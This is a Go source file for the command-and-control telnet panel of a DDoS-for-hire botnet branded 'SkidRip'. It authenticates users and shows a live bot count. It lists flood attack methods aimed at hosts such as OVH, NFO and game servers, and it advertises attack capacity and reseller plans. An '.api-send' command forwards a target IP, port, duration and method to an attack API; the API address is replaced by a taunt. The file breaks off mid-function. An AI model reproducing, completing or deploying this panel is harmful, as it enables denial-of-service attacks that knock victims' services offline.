
package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
    "net/http"
    "io/ioutil"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()
                if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; SkidRip | Human Verification\007"))); err != nil {//0m
                this.conn.Close()
            }

    time.Sleep(100 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\033[0m"))
    this.conn.Write([]byte("\033[0m"))
    this.conn.Write([]byte("\033[31m╔═══════════════════════════╦═════════════════════╗\r\n"))
    this.conn.Write([]byte("\033[31m║ \033[0m1. No Sharing Net IP      \033[31m║  \033[0mBreaking Any Of    \033[31m║\r\n"))
    this.conn.Write([]byte("\033[31m║ \033[0m2. No Hitting Gov         \033[31m║  \033[0mThe Given Rules    \033[31m║\r\n"))         
    this.conn.Write([]byte("\033[31m║ \033[0m3. No Spamming Attacks    \033[31m║  \033[0mWill Result in a   \033[31m║\r\n"))
    this.conn.Write([]byte("\033[31m║ \033[0m4. No Sharing Logins      \033[31m║  \033[0mDisable Of ur acc  \033[31m║\r\n"))
    this.conn.Write([]byte("\033[31m║ \033[0m5. No Hitting dstats      \033[31m╠═════════════════╦═══╝ \r\n"))
    this.conn.Write([]byte("\033[31m║ \033[0m6.                        \033[31m║ \033[0mPazda Runs Shit \033[31m║\r\n"))
    this.conn.Write([]byte("\033[31m║                           ║                 ║\r\n"))
    this.conn.Write([]byte("\033[31m║  \033[32m╔════════╗  \033[31m╔════════╗   ║                 ║\r\n"))
    this.conn.Write([]byte("\033[31m║  \033[32m║ \033[0m1. Yes \033[32m║  \033[31m║ \033[0m2. No  \033[31m║   ║                 ║\r\n"))
    this.conn.Write([]byte("\033[31m║  \033[32m╚════════╝  \033[31m╚════════╝   ╠═════════════════╝  \033[0m \r\n"))
    this.conn.Write([]byte("\033[31m╚═══════════════════════════╝\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[31m╔═[\033[0mRules\033[31m@\033[0mSkidRip\033[31m]  \x1b[0m\r\n"))
    this.conn.Write([]byte("\033[31m╚═══\033[0m➢ "))
    rules, err := this.ReadLine(false)
        if err != nil {
            return
        }

        rules = strings.ToLower(rules)

        if rules != "1" && rules != "1" && rules != "1" {
            fmt.Fprintln(this.conn, "\033[31mTo Use our services You Must accept the rules\033[0m\r")
            time.Sleep(time.Duration(2000) * time.Millisecond)
            return
        }

        if len(rules) > 7 {
            return
        }

    if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; SkidRip | Login\007"))); err != nil {//0m
                this.conn.Close()
            }
 
    this.conn.SetDeadline(time.Now().Add(15 * time.Second))
    this.conn.Write([]byte("\033[2J\033[1H")) //pazdano#9999 
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗╦╔═╦╔╦╗\033[31m╦═╗╦╔═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗╠╩╗║ ║║\033[31m╠╦╝║╠═╝\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝╩ ╩╩═╩╝\033[31m╩╚═╩╩  \033[0m \r\n")) 
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[31m╔═[\033[0mUsername\033[31m@\033[0mSkidRip\033[31m]  \x1b[0m\r\n"))
            this.conn.Write([]byte("\033[31m╚═══\033[0m➢ "))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(15 * time.Second))
    this.conn.Write([]byte("\033[2J\033[1H")) //pazdano#9999 
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗╦╔═╦╔╦╗\033[31m╦═╗╦╔═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗╠╩╗║ ║║\033[31m╠╦╝║╠═╝\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝╩ ╩╩═╩╝\033[31m╩╚═╩╩  \033[0m \r\n")) 
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[31m╔═[\033[0mPassword\033[31m@\033[0mSkidRip\033[31m]  \x1b[0m\r\n"))
            this.conn.Write([]byte("\033[31m╚═══\033[0m➢ "))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝\033[0m \r\n"))
            time.Sleep(250 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗╦╔═\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗╠╩╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝╩ ╩\033[0m \r\n"))
            time.Sleep(250 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗╦╔═╦\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗╠╩╗║\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝╩ ╩╩\033[0m \r\n"))
            time.Sleep(250 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗╦╔═╦╔╦╗\033[31m\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗╠╩╗║ ║║\033[31m\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝╩ ╩╩═╩╝\033[31m\033[0m \r\n"))
            time.Sleep(250 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗╦╔═╦╔╦╗\033[31m╦═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗╠╩╗║ ║║\033[31m╠╦╝\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝╩ ╩╩═╩╝\033[31m╩╚═\033[0m \r\n"))
            time.Sleep(250 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗╦╔═╦╔╦╗\033[31m╦═╗╦\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗╠╩╗║ ║║\033[31m╠╦╝║\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝╩ ╩╩═╩╝\033[31m╩╚═╩\033[0m \r\n")) 
            time.Sleep(250 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗╦╔═╦╔╦╗\033[31m╦═╗╦╔═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗╠╩╗║ ║║\033[31m╠╦╝║╠═╝\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝╩ ╩╩═╩╝\033[31m╩╚═╩╩  \033[0m \r\n")) 
            time.Sleep(250 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗╦╔═╦╔╦╗\033[31m╦═╗╦╔═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗╠╩╗║ ║║\033[31m╠╦╝║╠═╝\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝╩ ╩╩═╩╝\033[31m╩╚═╩╩  \033[0m \r\n")) 
            this.conn.Write([]byte("\033[31m              ╔═══════════════════════════════════════════════╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m              ║      \033[0mWelcome To The Start Screen Of SkidRip    \033[31m║\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m              ║       \033[0mPowered By YumekoAPI, Ran By SkidRip     \033[31m║\033[0m \r\n"))          
            this.conn.Write([]byte("\033[31m              ╚═══════════════════════════════════════════════╝\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                  ╔════════════════════════════════════════╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                  ║\033[0m        https://discord.io/SkidRip      \033[31m║\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                  ╚════════════════════════════════════════╝\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m              ╔═══════════════════════════════════════════════╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m              ║      \033[0mType [help] For Help With Commands       \033[31m║\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m              ║  \033[0mCopyright ©️ 2020 SkidRip All Rights Reserved  \033[31m║\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m              ╚═══════════════════════════════════════════════╝\033[0m \r\n"))
    this.conn.Write([]byte("\r\n"))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
        this.conn.Write([]byte("\r\033[0mIncorrect Information Logged!\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }
 
            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; [%d] Bots | User: %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
    
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[31m╔═[\033[0m" + username + "\033[31m@\033[0mSkidRip\033[31m]  \x1b[0m\r\n"))
        this.conn.Write([]byte("\033[31m╚═══\033[0m➢ "))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "LOGOUT" || cmd == "logout" {
            return
        }
        if cmd == "" {
            continue
        }


        if err != nil || cmd == "CLEAR" || cmd == "clear" || cmd == "cls" || cmd == "CLS" || cmd == "c" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝\033[0m \r\n"))
            time.Sleep(250 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗╦╔═\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗╠╩╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝╩ ╩\033[0m \r\n"))
            time.Sleep(250 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗╦╔═╦\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗╠╩╗║\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝╩ ╩╩\033[0m \r\n"))
            time.Sleep(250 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗╦╔═╦╔╦╗\033[31m\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗╠╩╗║ ║║\033[31m\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝╩ ╩╩═╩╝\033[31m\033[0m \r\n"))
            time.Sleep(250 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗╦╔═╦╔╦╗\033[31m╦═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗╠╩╗║ ║║\033[31m╠╦╝\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝╩ ╩╩═╩╝\033[31m╩╚═\033[0m \r\n"))
            time.Sleep(250 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗╦╔═╦╔╦╗\033[31m╦═╗╦\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗╠╩╗║ ║║\033[31m╠╦╝║\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝╩ ╩╩═╩╝\033[31m╩╚═╩\033[0m \r\n")) 
            time.Sleep(250 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗╦╔═╦╔╦╗\033[31m╦═╗╦╔═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗╠╩╗║ ║║\033[31m╠╦╝║╠═╝\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝╩ ╩╩═╩╝\033[31m╩╚═╩╩  \033[0m \r\n")) 
            time.Sleep(250 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗╦╔═╦╔╦╗\033[31m╦═╗╦╔═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗╠╩╗║ ║║\033[31m╠╦╝║╠═╝\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝╩ ╩╩═╩╝\033[31m╩╚═╩╩  \033[0m \r\n")) 
            this.conn.Write([]byte("\033[31m              ╔═══════════════════════════════════════════════╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m              ║      \033[0mWelcome To The Start Screen Of SkidRip    \033[31m║\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m              ║       \033[0mPowered By YumekoAPI, Ran By SkidRip     \033[31m║\033[0m \r\n"))          
            this.conn.Write([]byte("\033[31m              ╚═══════════════════════════════════════════════╝\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                  ╔════════════════════════════════════════╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                  ║\033[0m        https://discord.io/SkidRip      \033[31m║\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                  ╚════════════════════════════════════════╝\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m              ╔═══════════════════════════════════════════════╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m              ║      \033[0mType [help] For Help With Commands       \033[31m║\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m              ║  \033[0mCopyright ©️ 2020 SkidRip All Rights Reserved  \033[31m║\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m              ╚═══════════════════════════════════════════════╝\033[0m \r\n"))
            this.conn.Write([]byte("\r\n"))
    continue
        }   //info
        if err != nil || cmd == "RULES" || cmd == "rules" || cmd == "tos" || cmd == "TOS" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m╔═══════════════════════════╦═════════════════════╗\r\n"))
    		this.conn.Write([]byte("\033[31m║ \033[0m1. No Sharing Net IP      \033[31m║  \033[0mBreaking Any Of    \033[31m║\r\n"))
    		this.conn.Write([]byte("\033[31m║ \033[0m2. No Hitting Gov         \033[31m║  \033[0mThe Given Rules    \033[31m║\r\n"))         
    		this.conn.Write([]byte("\033[31m║ \033[0m3. No Spamming Attacks    \033[31m║  \033[0mWill Result in a   \033[31m║\r\n"))
    		this.conn.Write([]byte("\033[31m║ \033[0m4. No Sharing Logins      \033[31m║  \033[0mDisable Of ur acc  \033[31m║\r\n"))
    		this.conn.Write([]byte("\033[31m║ \033[0m5. No Hitting dstats      \033[31m╠═════════════════╦═══╝ \r\n"))
   			this.conn.Write([]byte("\033[31m║ \033[0m6.                        \033[31m║ \033[0mPazda Runs Shit \033[31m║\r\n"))
    		this.conn.Write([]byte("\033[31m║                           ║                 ║\r\n"))
    		this.conn.Write([]byte("\033[31m║  \033[32m╔════════╗  \033[31m╔════════╗   ║                 ║\r\n"))
    		this.conn.Write([]byte("\033[31m║  \033[32m║ \033[0m \033[32m║  \033[31m║ \033[0m  \033[31m║   ║                 ║\r\n"))
    		this.conn.Write([]byte("\033[31m║  \033[32m╚════════╝  \033[31m╚════════╝   ╠═════════════════╝  \033[0m \r\n"))
    		this.conn.Write([]byte("\033[31m╚═══════════════════════════╝\r\n"))
            continue
        }
        if err != nil || cmd == "HELP" || cmd == "help" || cmd == "?" {
            this.conn.Write([]byte("\033[2J\033[1H")) //pazdano#9999     
            this.conn.Write([]byte("\033[31m  ╔══════════════════════════╗\r\n"))        
            this.conn.Write([]byte("\033[31m  ║ \033[0mProject SkidRip      \033[31m     ╚═════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[31m  ║ \033[0m News     \033[31m> \033[0mShows SkidRip Net News                                  \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m  ║ \033[0m Methods  \033[31m> \033[0mShows Available Methods                                \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m  ║ \033[0m Stats    \033[31m> \033[0mShows Net Stats                                        \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m  ║ \033[0m Contacts \033[31m> \033[0mShows Contact Information                              \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m  ║ \033[0m Tos \033[31m     > \033[0mShows Terms Of Service                                 \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m  ║ \033[0m Tour \033[31m    > \033[0mTakes You On A Tour around SkidRip                      \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m  ║ \033[0m Plans \033[31m   > \033[0mShows Available Plans                                  \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m  ╚════════════════════════════════════════════════════════════════════╝\r\n"))                
            continue
        }
        
        if err != nil || cmd == "NEWS" || cmd == "news" {
            this.conn.Write([]byte("\033[2J\033[1H")) //pazdano#9999     
            this.conn.Write([]byte("\033[31m  ╔══════════════════════════╗\r\n"))        
            this.conn.Write([]byte("\033[31m  ║ \033[0mProject SkidRip      \033[31m     ╚═════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[31m  ║ \033[0mNews                                                               \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m  ║ \033[0mNet Officially Up Power Stabilizing at 150Gigs over all methods    \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m  ║ \033[0mReseller Spots are still Available If u want to buy one then type  \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m  ║ \033[0mContacts and dm One Of Us                                          \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m  ║                                                                    \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m  ║                                                                    \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m  ║                                                                    \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m  ╚════════════════════════════════════════════════════════════════════╝\r\n"))                
            continue
        }

        //if userInfo.admin == 1 && cmd == "ADDREG"
        if userInfo.admin == 1 && cmd == "ADMIN" || cmd == "admin" {
            this.conn.Write([]byte("\033[2J\033[1H")) //pazdano#9999 
            this.conn.Write([]byte("\033[31m                  ╔═╗╦╔═╦╔╦╗\033[31m╦═╗╦╔═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                  ╚═╗╠╩╗║ ║║\033[31m╠╦╝║╠═╝\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                  ╚═╝╩ ╩╩═╩╝\033[31m╩╚═╩╩  \033[0m \r\n")) 
            this.conn.Write([]byte("\033[0m              ╔═══════════════\033[31m╦═════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[0m              ║ -1 = max bots \033[31m║ ADDREG - Create a Regular Account   ║\r\n"))
            this.conn.Write([]byte("\033[0m              ║ -1 = max time \033[31m║ REMOVEUSER - Remomve an Account     ║\r\n"))
            this.conn.Write([]byte("\033[0m              ║ 0 = no cooldw \033[31m║ ADDADMIN - Add Admin Account        ║\r\n"))
            this.conn.Write([]byte("\033[0m              ╚═══════════════\033[31m╩═════════════════════════════════════╝\r\n"))
            continue
        }
            
            if err != nil || cmd == "offline" || cmd == "OFFLINE" || cmd == "api" || cmd == "API" {
            this.conn.Write([]byte("\033[2J\033[1H")) //pazdano#9999 
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[31m                  ╔═╗╦╔═╦╔╦╗\033[31m╦═╗╦╔═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                  ╚═╗╠╩╗║ ║║\033[31m╠╦╝║╠═╝\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                  ╚═╝╩ ╩╩═╩╝\033[31m╩╚═╩╩  \033[0m \r\n")) 
            this.conn.Write([]byte("\033[31m                           🤡 \033[0mUnder Construction \033[31m🤡\r\n"))
            continue
        }//BANNERS
                    if err != nil || cmd == "creds" || cmd == "credits" || cmd == "CREDS" || cmd == "CREDITS" || cmd == "contacts" || cmd == "CONTACTS" {
                        this.conn.Write([]byte("\033[2J\033[1H")) //pazdano#9999      
            this.conn.Write([]byte("\033[31m  ╔══════════════════════════╗\r\n"))        
            this.conn.Write([]byte("\033[31m  ║ \033[0mProject SkidRip      \033[31m     ╚═════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[31m  ║ \033[0mCredits                                                            \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m  ║ \033[0mOwner idfk LMFAO                                            \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m  ║ \033[0mDeve pazdano#9999                                           \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m  ║ \033[0m                                         \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m  ║                                                                    \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m  ║                                                                    \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m  ║                                                                    \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m  ╚════════════════════════════════════════════════════════════════════╝\r\n")) 
            continue
        }//credits

                
                   
        if err != nil || cmd == "methods" || cmd == "METHODS" {
    this.conn.Write([]byte("\033[2J\033[1H")) //pazdano#9999 
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[31m╔═════════════════════════╗    ╔═══════════════════════╗ \r\n"))
            this.conn.Write([]byte("\033[31m║    \033[0mStandard Methods     \033[31m║    ║      \033[0mGame Methods     \033[31m║ \r\n"))
            this.conn.Write([]byte("\033[31m║═════════════════════════║    ║═══════════════════════║ \r\n"))
            this.conn.Write([]byte("\033[31m║ \033[0m.stomp                  \033[31m║    ║ \033[0m.r6-drop              ║ \r\n"))
            this.conn.Write([]byte("\033[31m║ \033[0m.plain                  \033[31m║    ║                       ║ \r\n"))
            this.conn.Write([]byte("\033[31m║ \033[0m.std                    \033[31m║    ║ \033[0m  More To Come Soon   ║ \r\n"))
            this.conn.Write([]byte("\033[31m║ \033[0m.xmas                   \033[31m║    ╚════╦╦═════════════════╝ \r\n"))
            this.conn.Write([]byte("\033[31m║ \033[0m.usyn                   \033[31m╠═════════╣║\r\n"))
            this.conn.Write([]byte("\033[31m║ \033[0m.tcpall                 \033[31m╠═════════╣║\r\n"))
            this.conn.Write([]byte("\033[31m║ \033[0m.frag                   \033[31m║    ╔════╩╩═════════════════╗\r\n"))
            this.conn.Write([]byte("\033[31m║ \033[0m.pack                   \033[31m║    ║    \033[0mSpecial Methods    \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m║ \033[0m.ruse                   \033[31m║    ║═══════════════════════║\r\n"))
            this.conn.Write([]byte("\033[31m║ \033[0m.asyn                   \033[31m║    ║ \033[0m.hydra-drop .cia .awe \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m║ \033[0m.shock                  \033[31m║    ║ \033[0m.ovh-kill .ovh-v2     \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m║ \033[0m.htvac                  \033[31m║    ║ \033[0m.ovh-drop .nfo .ice   \033[31m║\r\n"))
            this.conn.Write([]byte("\033[31m║ \033[0m.rail                   \033[31m║    ╚════╦╦══════════════╦╦═╝\r\n"))
            this.conn.Write([]byte("\033[31m║ \033[0m.randhex                \033[31m║         ║║              ║║\r\n"))
            this.conn.Write([]byte("\033[31m║ \033[0m.stdhex                 \033[31m╠═════════╝║ \033[0mHow To Send  \033[31m║║\r\n"))
            this.conn.Write([]byte("\033[31m║ \033[0m.udphex                 \033[31m╠══════════╝              ║║\r\n"))
            this.conn.Write([]byte("\033[31m╚═══╦╦════════════════════╣ \033[0m.method ip port dport=  \033[31m║║\r\n"))
            this.conn.Write([]byte("\033[31m    ║║ \033[0mRan By SkidRip Made \033[31m║ \033[0mPort                    \033[31m║║\r\n"))
            this.conn.Write([]byte("\033[31m    ║║ \033[0mBy Pazdan          \033[31m║                         ║║\r\n"))
            this.conn.Write([]byte("\033[31m╔═══╩╩════════════════════╣                         ║║\r\n"))
            this.conn.Write([]byte("\033[31m║    \033[0mStandard Methods     \033[31m╠═════════════════════════╝║\r\n"))
            this.conn.Write([]byte("\033[31m║═════════════════════════╠══════════════════════════╝\r\n"))
            this.conn.Write([]byte("\033[31m║ .ack                    ║\r\n"))
            this.conn.Write([]byte("\033[31m║ .syn                    ║\r\n"))
            this.conn.Write([]byte("\033[31m║ .dns                    ║\r\n"))
            this.conn.Write([]byte("\033[31m╚═════════════════════════╝\r\n"))
            continue
        }

        if err != nil || cmd == ".api-send" || cmd == ".api-send" {
            this.conn.Write([]byte("\033[31m                  ╔═╗╦╔═╦╔╦╗\033[31m╦═╗╦╔═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                  ╚═╗╠╩╗║ ║║\033[31m╠╦╝║╠═╝\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                  ╚═╝╩ ╩╩═╩╝\033[31m╩╚═╩╩  \033[0m \r\n")) 
            this.conn.Write([]byte("\033[31m╔═[\033[0mIpv4\033[31m@\033[0mSkidRip\033[31m]  \x1b[0m\r\n"))
            this.conn.Write([]byte("\033[31m╚═══\033[0m➢ "))
            HOST, err := this.ReadLine(false)
            this.conn.Write([]byte("\033[31m                  ╔═╗╦╔═╦╔╦╗\033[31m╦═╗╦╔═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                  ╚═╗╠╩╗║ ║║\033[31m╠╦╝║╠═╝\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                  ╚═╝╩ ╩╩═╩╝\033[31m╩╚═╩╩  \033[0m \r\n")) 
            this.conn.Write([]byte("\033[31m╔═[\033[0mport\033[31m@\033[0mSkidRip\033[31m]  \x1b[0m\r\n"))
            this.conn.Write([]byte("\033[31m╚═══\033[0m➢ "))
            PORT, err := this.ReadLine(false)
            this.conn.Write([]byte("\033[31m                  ╔═╗╦╔═╦╔╦╗\033[31m╦═╗╦╔═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                  ╚═╗╠╩╗║ ║║\033[31m╠╦╝║╠═╝\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                  ╚═╝╩ ╩╩═╩╝\033[31m╩╚═╩╩  \033[0m \r\n")) 
            this.conn.Write([]byte("\033[31m╔═[\033[0mtime\033[31m@\033[0mSkidRip\033[31m]  \x1b[0m\r\n"))
            this.conn.Write([]byte("\033[31m╚═══\033[0m➢ "))
            TIME, err := this.ReadLine(false)
            this.conn.Write([]byte("\033[31m                  ╔═╗╦╔═╦╔╦╗\033[31m╦═╗╦╔═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                  ╚═╗╠╩╗║ ║║\033[31m╠╦╝║╠═╝\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                  ╚═╝╩ ╩╩═╩╝\033[31m╩╚═╩╩  \033[0m \r\n")) 
            this.conn.Write([]byte("\033[31m╔═[\033[0mmethod\033[31m@\033[0mSkidRip\033[31m]  \x1b[0m\r\n"))
            this.conn.Write([]byte("\033[31m╚═══\033[0m➢ "))
            METHOD, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "nice try lmfao pazdano#9999 made this shiz" + HOST + "&port=" + PORT + "&time=" + TIME + "&method=" + METHOD + ""
            tr := &http.Transport{
                ResponseHeaderTimeout: 5 * time.Second,
                DisableCompression:    true,
            }
            client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝\033[0m \r\n"))
            time.Sleep(250 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗╦╔═\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗╠╩╗\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╝╩ ╩\033[0m \r\n"))
            time.Sleep(250 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[31m                                   ╔═╗╦╔═╦\033[0m \r\n"))
            this.conn.Write([]byte("\033[31m                                   ╚═╗╠╩╗║\033[0m \r\n"))
